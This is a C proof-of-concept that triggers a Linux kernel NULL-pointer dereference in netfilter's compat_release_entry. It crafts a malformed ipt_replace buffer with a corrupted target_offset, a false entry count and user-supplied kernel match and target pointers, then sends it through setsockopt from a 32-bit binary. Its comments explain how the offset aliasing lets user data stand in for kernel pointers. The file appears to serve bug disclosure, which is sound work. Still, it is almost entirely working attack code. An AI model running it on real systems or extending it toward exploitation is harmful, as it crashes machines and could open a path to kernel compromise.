/*
 * repro-compatReleaseEntry.c
 *    Trigger a NULL dereference to demonstrate a bug in compat_release_entry
 *
 * This MUST be compiled as a 32-bit binary to work:
 * gcc -m32 -static -g repro-compatReleaseEntry.c -o repro-compatReleaseEntry
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/netfilter_ipv4/ip_tables.h>

void
xperror(int bad, char *msg)
{
    if(bad) {
        perror(msg);
        exit(1);
    }
}

int 
main(int argc, char **argv)
{
    char buf[65 * 1024];
    struct ipt_replace repl;
    struct ipt_entry ent;
    struct xt_entry_target targ, targ2;
    struct xt_entry_match match;
    char *p;
    socklen_t valsz;
    int x, s;

    s = socket(AF_INET, SOCK_DGRAM, 0);
    xperror(s == -1, "socket");
    
    /* build [repl [ent match target ... target2]] */
    memset(&targ, 0, sizeof targ);
    targ.u.target_size = 0;

    memset(&targ2, 0, sizeof targ2);
    targ2.u.target_size = 0;
    targ2.u.kernel.target = NULL; // causes NULL-pointer deref in kernel (but match NULL pointer is deref'd first)

    memset(&match, 0, sizeof match);
    strcpy(match.u.user.name, "icmp");
    match.u.kernel.match = NULL; // causes NULL-pointer deref in kernel
    match.u.match_size = 65535; // consume all space till target_offset=65535

    memset(&ent, 0, sizeof ent);
    ent.next_offset = sizeof ent + sizeof match + sizeof targ;
    /*
     * this value of target_offset is too small.  It will cause
     * there to be no match entries when initializing the entry.
     * It will cause target->u.kernel.target to alias ent->target_offset,
     * which will overwritten e->target_offset with 0xfff after 
     * initializing the empty matches.  Later when the matches
     * are released by compat_release_entry() the matches will be
     * taken from the space immediately following the entry, which
     * will contain a user-provided match->u.kernel.match record
     * instead of the kernel provided match->u.kernel.match record!
     */
    ent.target_offset = 74;

    memset(&repl, 0, sizeof repl);
    repl.num_entries = 2; // intentionally wrong! we only provide one!
    repl.num_counters = 1;
    repl.size = sizeof repl + 65535 + sizeof targ;
    repl.valid_hooks = 0;

    p = buf;
    memcpy(p, &repl, sizeof repl);
    p += sizeof repl;
    memcpy(p, &ent, sizeof ent);
    p += sizeof ent;
    memcpy(p, &match, sizeof match);
    p += sizeof match;
    memcpy(p, &targ, sizeof targ);
    p += sizeof targ;

    p = buf + sizeof repl + 65535; // the target, after target_offset has been corrupted
    memcpy(p, &targ2, sizeof targ2);
    p += sizeof targ;
    valsz = repl.size; 

    /* when compiled -m32 this will call compat_setsockopt */
    x = setsockopt(s, SOL_IP, IPT_SO_SET_REPLACE, buf, valsz);
    printf("setsockopt returned %d\n", x);
    printf("we didn't cause a crash.\n");
    return 0;
}

